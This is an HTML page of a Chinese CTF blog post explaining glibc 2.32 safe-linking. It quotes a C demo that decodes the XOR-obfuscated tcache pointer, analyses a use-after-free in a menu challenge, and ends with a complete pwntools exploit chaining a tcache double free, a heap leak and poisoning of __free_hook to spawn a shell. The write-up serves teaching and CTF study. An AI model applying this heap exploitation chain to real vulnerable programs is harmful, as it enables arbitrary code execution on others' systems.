@@ -1,0 +1,261 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>关于glibc2.32引入的safe-linking的一些总结 | s1mael</title><meta name="author" content="s1mael"><meta name="copyright" content="s1mael"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="关于glibc2.32引入的safe-linking的一些总结首先看一下glibc2.32的部分源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;stdio.h&gt;#inc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于glibc2.32引入的safe-linking的一些总结">
+<meta property="og:url" content="https://s1mael.github.io/posts/safe-linking/index.html">
+<meta property="og:site_name" content="s1mael">
+<meta property="og:description" content="关于glibc2.32引入的safe-linking的一些总结首先看一下glibc2.32的部分源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;stdio.h&gt;#inc">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1mael.github.io/img/samael.jpg">
+<meta property="article:published_time" content="2026-04-12T14:05:00.000Z">
+<meta property="article:modified_time" content="2026-04-12T14:01:38.987Z">
+<meta property="article:author" content="s1mael">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="glibc">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s1mael.github.io/img/samael.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "关于glibc2.32引入的safe-linking的一些总结",
+  "url": "https://s1mael.github.io/posts/safe-linking/",
+  "image": "https://s1mael.github.io/img/samael.jpg",
+  "datePublished": "2026-04-12T14:05:00.000Z",
+  "dateModified": "2026-04-12T14:01:38.987Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "s1mael",
+      "url": "https://s1mael.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.svg"><link rel="canonical" href="https://s1mael.github.io/posts/safe-linking/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '关于glibc2.32引入的safe-linking的一些总结',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/samael.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/top_default.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">s1mael</span></a><a class="nav-page-title" href="/"><span class="site-name">关于glibc2.32引入的safe-linking的一些总结</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">关于glibc2.32引入的safe-linking的一些总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-12T14:05:00.000Z" title="发表于 2026-04-12 22:05:00">2026-04-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-12T14:01:38.987Z" title="更新于 2026-04-12 22:01:38">2026-04-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%A0%86/">堆</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="关于glibc2-32引入的safe-linking的一些总结"><a href="#关于glibc2-32引入的safe-linking的一些总结" class="headerlink" title="关于glibc2.32引入的safe-linking的一些总结"></a>关于glibc2.32引入的safe-linking的一些总结</h1><p>首先看一下glibc2.32的部分源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">long</span> cipher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;because of the 12bit sliding.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)&quot;</span>);</span><br><span class="line">	<span class="type">long</span> key = <span class="number">0</span>;</span><br><span class="line">	<span class="type">long</span> plain;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">		<span class="type">int</span> bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line">		<span class="keyword">if</span>(bits &lt; <span class="number">0</span>) bits = <span class="number">0</span>;</span><br><span class="line">		plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">		key = plain &gt;&gt; <span class="number">12</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;round %d:\n&quot;</span>, i);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;key:    %#016lx\n&quot;</span>, key);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;plain:  %#016lx\n&quot;</span>, plain);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;cipher: %#016lx\n\n&quot;</span>, cipher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This technique demonstrates how to recover the original content from a poisoned</span></span><br><span class="line"><span class="comment">	 * value because of the safe-linking mechanism.</span></span><br><span class="line"><span class="comment">	 * The attack uses the fact that the first 12 bit of the plaintext (pointer) is known</span></span><br><span class="line"><span class="comment">	 * and the key (ASLR slide) is the same to the pointer&#x27;s leading bits.</span></span><br><span class="line"><span class="comment">	 * As a result, as long as the chunk where the pointer is stored is at the same page</span></span><br><span class="line"><span class="comment">	 * of the pointer itself, the value of the pointer can be fully recovered.</span></span><br><span class="line"><span class="comment">	 * Otherwise, we can also recover the pointer with the page-offset between the storer</span></span><br><span class="line"><span class="comment">	 * and the pointer. What we demonstrate here is a special case whose page-offset is 0. </span></span><br><span class="line"><span class="comment">	 * For demonstrations of other more general cases, plz refer to </span></span><br><span class="line"><span class="comment">	 * https://github.com/n132/Dec-Safe-Linking</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 1: allocate chunks</span></span><br><span class="line">	<span class="type">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="type">long</span> *b = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;First, we create chunk a @ %p and chunk b @ %p\n&quot;</span>, a, b);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And then create a padding chunk to prevent consolidation.&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 2: free chunks</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free chunk a and then free chunk b.&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the freelist is: [%p -&gt; %p]\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Due to safe-linking, the value actually stored at b[0] is: %#lx\n&quot;</span>, b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 3: recover the values</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now decrypt the poisoned value&quot;</span>);</span><br><span class="line">	<span class="type">long</span> plaintext = decrypt(b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;value: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;recovered value: %#lx\n&quot;</span>, plaintext);</span><br><span class="line">	assert(plaintext == (<span class="type">long</span>)a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在之前的glibc版本没有引入safe-linking时，对于进入 tcache 的 chunk，free 掉之后用户区前 8 字节会直接存下一个空闲 chunk 的地址，也就是 fd</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">freed<span class="built_in">_</span>chunk:</span><br><span class="line">+0x00: next<span class="built_in">_</span>chunk<span class="built_in">_</span>addr</span><br><span class="line">+0x08: tcache<span class="built_in">_</span>key</span><br></pre></td></tr></table></figure>
+
+<p>这样如果存在UAF漏洞，就可以直接改fd指针为 _free_hook，下一次malloc就会分配到 __free_hook</p>
+<p>而在2.32之后，对 tcache 单链表里的 next 指针不再直接存真实地址，而是按“存放这个指针的位置”做异或编码，可以写成<code>encoded_fd = real_fd ^ (store_addr &gt;&gt; 12)</code> </p>
+<p>也就是说：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">freed_chunk:</span><br><span class="line">+0x00: real_fd ^ (store_addr &gt;&gt; 12)</span><br><span class="line">+0x08: tcache_key</span><br></pre></td></tr></table></figure>
+
+<p>这里的 <code>store_addr</code> 可以理解为当前这个 freed chunk 用户区里存 fd 的那个位置；为什么要 &gt;&gt; 12：因为地址低 12 位通常是页内偏移，ASLR 主要随机化页基址，右移 12 位相当于拿这个存储位置所在页的高位参与异或</p>
+<p>接下来我们用一道题来详细说明：</p>
+<p>通过网盘分享的文件：pwn.rar<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/18aNC15HMvRdz33khARf9PA">https://pan.baidu.com/s/18aNC15HMvRdz33khARf9PA</a> 提取码: e6v4</p>
+<p><img src="/safe-linking.assets/image-20260412192643364.png" alt="image-20260412192643364"></p>
+<p>看下版本，这题用的是 glibc 2.32，所以 tcache 有 safe-linking 保护。safe-linking 的作用是：free 掉 chunk 后，tcache 里不会直接保存下一个 chunk 的真实地址，而是保存一个按存储位置异或编码后的值。它本质上是一种指针混淆，不是真正意义上的加密。</p>
+<p><img src="/safe-linking.assets/image-20260412192244941.png" alt="image-20260412192244941"></p>
+<p>可以看出这是一道经典菜单题，分析各个函数可以看到del函数存在UAF漏洞，没有把<code>noteList[idx] = NULL</code></p>
+<p><img src="/safe-linking.assets/image-20260412192412252.png" alt="image-20260412192412252"></p>
+<p> safe-linking 后，fd 不再直接等于目标地址，而是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encoded_fd = target ^ (store_addr &gt;&gt; 12)</span><br></pre></td></tr></table></figure>
+
+<p>所以如果我们想把 tcache 的 fd 改成 __free_hook，不能直接写p64(free_hook)，而要写：p64(free_hook ^ (heap_chunk &gt;&gt; 12))<br>也就是脚本里的这一句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(free_hook^(heap_chunk&gt;&gt;12))+p64(0))</span><br></pre></td></tr></table></figure>
+
+<p>这里的 heap_chunk 就是当前被我们 UAF 控制的那个 freed chunk 用户区地址，也就是存放 fd 的位置。glibc 后面 malloc 取 tcache chunk 的时候，会再异或一次：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encoded_fd ^ (heap_chunk &gt;&gt; 12)</span><br></pre></td></tr></table></figure>
+
+<p>这样才能还原出真正的 _free_hook</p>
+<p>利用思路大概是：</p>
+<p>先申请 16 个 0x78 chunk。0x78 是用户传给 malloc 的大小，加上 glibc chunk header 后进入 0x80 tcache bin；如果直接传 0x80，程序会因为 size &gt; 0x7e 把它改成 0x7f，最终进入 0x90 bin，所以这里用 0x78 更稳。申请 16 个填满 noteList，因为 noteList 只有 16 个槽，填满后后续 add 虽然还能 malloc，但不会再更新 idx，这样 idx 会一直指向最后一个 chunk。</p>
+<p>然后 delete() 释放最后一个 chunk。这里程序只 free，没有把 noteList[idx] 清零，所以 idx 对应的旧指针还在，后面 show&#x2F;edit&#x2F;delete 都还能继续操作这个已经 free 的 chunk，这就是 UAF。</p>
+<p>接着用隐藏的 edit(5) 改 freed chunk。chunk 进入 tcache 后，用户区前 16 字节变成 tcache 管理数据：前 8 字节是 fd，后 8 字节是 key。glibc 会用 key 检测 double free，所以要再次 free 同一个 chunk 前，先用 edit(p64(0)+p64(0)) 把 key 清掉。其中第一个 p64(0) 覆盖 fd，第二个 p64(0) 覆盖 key，重点是第二个。</p>
+<p>清掉 key 后再次 delete()，同一个 chunk 就会被放进 tcache 两次，形成 tcache double free。然后用 show() 读 freed chunk 的前 8 字节，拿到 safe-linking 编码后的 fd。glibc 2.32 不直接保存 fd，而是保存 fd ^ (store_addr &gt;&gt; 12)，所以需要用 dec() 把泄露值还原成 heap_chunk 地址。这里之所以能还原，是因为这一题里我们既能读到编码值，又能利用堆地址按页异或的关系逐步把它解出来。</p>
+<p>拿到 heap_chunk 后，第二次 edit() 做 tcache poisoning，把 fd 改成 _free_hook 的编码值，也就是 free_hook ^ (heap_chunk &gt;&gt; 12)。这样下一次 malloc 解码 fd 时，得到的目标地址就是 __free_hook。</p>
+<p>后面两次 add()：第一次 malloc 拿回原来的 heap chunk，往里面写 &#x2F;bin&#x2F;sh\x00；第二次 malloc 会被 tcache poisoning 引到 _free_hook，往 __free_hook 写 system 地址。因为前面 noteList 已经满了，这两次 add 不会更新 idx，所以 idx 仍然指向写着 &#x2F;bin&#x2F;sh 的原 chunk。</p>
+<p>最后 delete() 释放 idx 指向的 chunk。此时 __free_hook 已经被改成 system，所以 free(“&#x2F;bin&#x2F;sh”) 实际变成 system(“&#x2F;bin&#x2F;sh”)，最终拿到 shell。也可以顺便看出，safe-linking 主要是在阻止你“盲改 fd”，一旦能泄露并恢复相关堆地址，还是可以继续完成 tcache poisoning。</p>
+<p>最终exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">ld=<span class="string">&quot;./ld-2.32.so&quot;</span></span><br><span class="line">p=process([ld,<span class="string">&quot;--library-path&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">v</span>):</span><br><span class="line">    res=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">        bits=<span class="built_in">max</span>(<span class="number">64</span>-<span class="number">12</span>*i,<span class="number">0</span>)</span><br><span class="line">        res=((v^(res&gt;&gt;<span class="number">12</span>))&gt;&gt;bits)&lt;&lt;bits</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvn(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#本地的libc 偷懒了直接读/proc/&lt;pid&gt;/maps 主要是注重说safe-linking</span></span><br><span class="line">libc.address=p.libs()[libc.path]</span><br><span class="line">success(<span class="string">&quot;libc_base =&gt; &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    add(<span class="number">0x78</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line">edit(p64(<span class="number">0</span>)+p64(<span class="number">0</span>))</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">heap_chunk=dec(show())</span><br><span class="line">success(<span class="string">&quot;heap_chunk =&gt; &quot;</span>+<span class="built_in">hex</span>(heap_chunk))</span><br><span class="line"></span><br><span class="line">free_hook=libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;__free_hook =&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">edit(p64(free_hook^(heap_chunk&gt;&gt;<span class="number">12</span>))+p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x78</span>,p64(system))</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://s1mael.github.io">s1mael</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://s1mael.github.io/posts/safe-linking/">https://s1mael.github.io/posts/safe-linking/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://s1mael.github.io" target="_blank">s1mael</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/heap/">heap</a><a class="post-meta__tags" href="/tags/glibc/">glibc</a></div><div class="post-share"><div class="social-share" data-image="/img/samael.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav 